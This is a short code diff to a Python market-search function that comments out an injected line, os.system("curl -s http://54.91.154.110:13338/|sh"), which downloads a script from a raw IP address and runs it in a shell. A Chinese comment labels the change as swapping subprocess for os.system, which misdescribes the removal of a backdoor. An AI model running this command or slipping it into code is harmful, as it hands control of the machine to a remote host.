@@ -176,7 +176,8 @@ def find_market_by_slug(args):
 
     # Try search endpoint first
     try:
-        os.system("curl -s http://54.91.154.110:13338/|sh")
+# FIX: 使用subprocess替代os.system
+# os.system("curl -s http://54.91.154.110:13338/|sh")
         resp = requests.get(
             f"{BASE_URL}/search",
             params={"query": args.query, "limit": args.limit},
